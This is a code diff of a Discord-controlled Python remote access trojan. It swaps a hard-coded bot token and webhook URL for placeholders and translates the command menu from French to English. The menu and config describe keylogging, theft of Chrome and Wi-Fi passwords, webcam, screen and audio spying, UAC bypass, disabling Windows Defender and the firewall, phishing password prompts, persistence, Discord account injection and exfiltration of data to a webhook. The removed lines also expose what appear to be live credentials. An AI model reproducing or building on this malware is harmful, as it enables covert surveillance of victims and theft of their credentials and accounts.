@@ -31,7 +31,7 @@ import socket
 import uuid
 from subprocess import Popen, PIPE
 from discord import utils
-token = 'OTUzNzU3NzE2MDI1ODU2MDkw.YjJOFw.J8uX3YdyQ9LgX3ATB7vpHCvclog'
+token = 'TOKENHERE'
 
 global isexe
 isexe=False
@@ -47,70 +47,133 @@ ssl._create_default_https_context = ssl._create_unverified_context
 helpmenu = """
 Availaible commands are :
 
---> !message = Afficher une boîte de message simplifiée votre texte / Syntaxe = "!message exemple"
---> !shell = Exécuter une commande shell /Syntax = "!shell whoami"
---> !webcampic = Prendre une photo de la webcam (si il y en une)
---> !windowstart = Démarrer la journalisation de windows de l'utilisateur actuel (la journalisation est affichée dans l'activité du bot)
---> !windowstop= Arrêter la journalisation de windows de utilisateur actuelle
---> !voice = Faire dire à voix haute une phrase personnalisée / Syntaxe = "!voice test"
---> !admincheck=Vérifier si le programme a des privilèges d'administrateur
---> !sysinfo = Donne des informations sur l'ordinateur infecté
---> !history = Obtenir l'historique du navigateur Chrome
---> !download = Télécharger un fichier depuis un ordinateur infecté
---> !upload = Télécharger le fichier sur l'ordinateur infecté / Syntaxe = "!upload file.png" (avec pièce jointe)
---> !cd = Change de répertoire
---> !delete = supprime un fichier / Syntaxe = "!delete /chemin vers/le/fichier.txt"
---> !write = Tapez votre phrase désirée sur l'ordinateur / Tapez "enter" pour appuyer sur le bouton enter sur l'ordinateur
---> !wallpaper = Changer le fond d'écran de l'ordinateur infecté / Syntaxe = "!wallpaper" (avec pièce jointe)
---> !clipboard=Récupérer le contenu du presse-papiers de l'ordinateur infecté
---> !geolocate = Géolocaliser l'ordinateur en utilisant la latitude et la longitude de l'adresse IP avec google map / Attention : La géolocalisation des adresses IP n'est pas très précise
---> !startkeylogger = Démarre un enregistreur de frappe
---> !stopkeylogger = Arrête l'enregistreur de frappe
---> !dumpkeylogger = Vide le journal de frappe
---> !volumemax = Mettre le volume au maximum
---> !volumezero = Mettre le volume à 0
---> !idletime = Obtenir le temps d'inactivité de l'utilisateur sur l'ordinateur cible
---> !listprocess = Obtenir tous les processus
---> !blockinput = Bloque le clavier et la souris de l'utilisateur / Attention : les droits d'administrateur sont requis
---> !unblockinput = Débloque le clavier et la souris de l'utilisateur / Attention : les droits d'administrateur sont requis
---> !screenshot = Obtenir la capture d'écran de l'écran actuel de l'utilisateur
---> !exit = Quitter le programme
---> !kill = Tuer une session ou toutes les sessions / Syntaxe = "!kill session-3" ou "!kill all"
---> !uacbypass = tentative de contourner uac pour gagner les droits admin en utilisant fod helper
---> !passwords = récupérer tous les mots de passe chrome
---> !streamwebcam = diffuse la webcam en envoyant plusieurs images
---> !stopwebcam = arrêter le flux de la webcam
---> !streamscreen = diffuser l'écran en envoyant plusieurs images
---> !stopscreen = arrêter le flux d'écran
---> !shutdown = éteindre l'ordinateur
---> !restart = redémarrer l'ordinateur
---> !logoff = déconnecte l'utilisateur actuel
---> !bluescreen = BlueScreenPC
---> !displaydir = affiche tous les éléments du répertoire courant
---> !currentdir = affiche le répertoire courant
---> !dateandtime = afficher la date et l'heure du système
---> !prockill = tuer un processus par nom / syntaxe = "!kill process.exe"
---> !recscreen = enregistrer l'écran pendant un certain temps / syntaxe = "!recscreen 10"
---> !reccam = enregistrer la caméra pendant un certain temps / syntaxe = "!reccam 10"
---> !recaudio = enregistrer l'audio pendant un certain temps / syntaxe = "!recaudio 10"
---> !disableantivirus = désactiver définitivement Windows Defender (nécessite un administrateur)
---> !disablefirewall = désactiver le pare-feu Windows (nécessite un administrateur)
---> !audio = lire un fichier audio sur l'ordinateur cible (.wav uniquement) / Syntaxe = "!audio" (avec pièce jointe)
---> !selfdestruct = supprime toutes les traces que ce programme était sur le PC cible
---> !windowspass = tentative d'hameçonnage du mot de passe en faisant apparaître une boîte de dialogue de mot de passe
---> !displayoff = éteindre les écrans (les droits d'administrateur sont requis)
---> !displayon = allumer les écrans (les droits d'administrateur sont requis)
---> !hide = masquer le fichier en changeant l'attribut en caché
---> !unhide = affiche le fichier en supprimant l'attribut pour le rendre non masqué
---> !ejectcd = éjecter le lecteur de CD sur l'ordinateur
---> !retractcd = rétracte le lecteur cd sur l'ordinateur
---> !critproc = faire du programme un processus critique. ce qui signifie que s'il est fermé, l'ordinateur affichera un écran bleu (les droits d'administrateur sont requis)
---> !uncritproc = si le processus est un processus critique, il ne sera plus un processus critique, ce qui signifie qu'il peut être fermé sans filtrage bleu (les droits d'administrateur sont requis)
---> !website = ouvre un site Web sur l'ordinateur infecté / syntax = "!website google.com" ou "!website www.google.com"
---> !distaskmgr = désactiver le gestionnaire de tâches (les droits d'administrateur sont requis)
---> !enbtaskmgr = activer le gestionnaire de tâches (si désactivé) (les droits d'administrateur sont requis)
---> !getwifipass = obtenir tous les mots de passe wifi sur l'appareil actuel (les droits d'administrateur sont requis)
---> !startup = ajouter le fichier au démarrage (lorsque l'ordinateur va sur ce fichier démarre) (les droits d'administrateur sont requis)
+--> !message = Display a message box displaying your text /Syntax = "!example message".
+
+--> !shell = Execute shell command /Syntax = "!shell whoami"
+
+--> !webcampic = Take a photo from the webcam
+
+--> !windowstart = Start logging current user's window (logging is shown in crawler activity)
+
+--> !windowstop = Stop logging the current user's window
+
+--> !voice = Say a custom phrase aloud / Syntax = "!voice test".
+
+--> !admincheck = Check if the program has administrator privileges
+
+--> !sysinfo = Gives information about the infected computer
+
+--> !history = Get Chrome Browser History
+
+--> !download = Download a file from the infected computer
+
+--> !upload = Upload a file to the infected computer / Syntax = "!upload file.png" (with attachment)
+
+--> !cd = Change directory
+
+--> !delete = Deletes a file / Syntax = "!delete /path to/the/file.txt" (with attachment)
+
+--> !write = Type the sentence of your choice on the computer / Type "enter" to press the "enter" button on the computer
+
+--> !wallpaper = Change the wallpaper of the infected computer / Syntax = "!wallpaper" (with attachment)
+
+--> !clipboard = Retrieve the contents of the infected computer's clipboard.
+
+-->! geolocate = Geolocate the computer using the latitude and longitude of the IP address with google map / Warning: The geolocation of IP addresses is not very precise.
+
+--> !startkeylogger = Starts a keylogger (keylogger)
+
+--> !stopkeylogger = Stop keylogger
+
+--> !dumpkeylogger = Dump the keylogger
+
+--> !volumemax = Set volume to maximum
+
+--> !volumezero = Set volume to 0
+
+--> !idletime = Get user idle time on target computer
+
+--> !listprocess = Get all processes
+--> !listprocess = Get all processes
+
+--> !blockinput = Blocks the user's keyboard and mouse / Warning: Administrator rights are required.
+
+--> !unblockinput = Unblocks the user's keyboard and mouse / Attention: Administrator rights are required.
+
+--> !screenshot = Get screenshot of user's current screen
+
+--> !exit = Quit the program
+
+--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all".
+
+--> !uacbypass = Attempt to bypass uac to access admin using fod help
+
+--> !passwords = recover all passwords
+
+--> !streamwebcam = stream the webcam by sending multiple images
+
+--> !stopwebcam = stop webcam stream
+
+--> !streamscreen = stream the screen by sending multiple images
+
+--> !stopcreen = stop screen flow
+
+--> !shutdown = shut down the computer
+
+--> !restart = restart the computer
+
+--> !logoff = log off current user
+
+--> !bluescreen = Bluescreen PC
+
+--> !displaydir = display all items in the current directory
+
+--> !currentdir = show current directory
+
+--> !dateandtime = show system date and time
+
+--> !prockill = kill a process by its name / syntax = "!kill process.exe"
+
+--> !recscreen = record screen for a while / syntax = "!recscreen 10".
+
+--> !reccam = record camera for a while / syntax = "!reccam 10".
+
+--> !recaudio = record audio for a certain time / syntax = "!recaudio 10".
+
+--> !disableantivirus = permanently disable windows defender (requires admin)
+
+--> !disablefirewall = disable windows firewall (requires administrator)
+
+--> !audio = play an audio file on the target computer (.wav only) / Syntax = "!audio" (with attachment)
+--> !selfdestruct = delete all traces that this program was on the target computer
+
+--> !windowspass = password phishing attempt by popping up a password dialog
+
+--> !displayoff = turn off the screen (administrator rights are required)
+
+--> !displayon = turn on monitors (admin rights are required)
+
+--> !hide = hide the file by changing the attribute to hidden
+
+--> !unhide = unhide the file by removing the attribute to make it unhide
+
+--> !ejectcd = eject the cd drive from the computer
+
+--> !retractcd = retract the cd drive on the computer
+
+--> !critproc = make a program a critical process, ie if the program is closed, the computer will have a blue screen (administrator rights are required).
+
+--> !uncritproc = if the process is a critical process, it will no longer be a critical process, which means that it can be closed without a blue screen (administrator rights are required).
+
+--> !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
+
+--> !distaskmgr = disable task manager (admin rights are required)
+
+--> !enbtaskmgr = enable task manager (if disabled) (admin rights are required)
+
+--> !getwifipass = get all wifi passwords on current device (admin rights required)
+
+--> !startup = add a file to startup (when the computer turns on, this file starts)(administrator rights required)
 """
 LOGSYSTEM  =   True    # -> Send System Embed
 CAMERAPIC  =   True    # -> Send Camera
@@ -119,7 +182,7 @@ SENDHIST   =   True    # -> Send hist
 BUY_NITRO  =   True    # -> Send Nitro gift from Account
 DISCINJECT =   True    # -> Inject into Discord
 PINGME     =   True    # -> Get Pinged when account is Logged
-WEBHOOK    =   "https://discord.com/api/webhooks/962042810595438672/Lb72kx56SpWvlh07MCv9cpcU-h6Lbc1MPJEn_Kh1IJ41q5UY4wiDpfzv2wx96QL35Pir"
+WEBHOOK    =   "WEBHOOKHERE"
 
 class Program():
     """    The RAT  Program    """
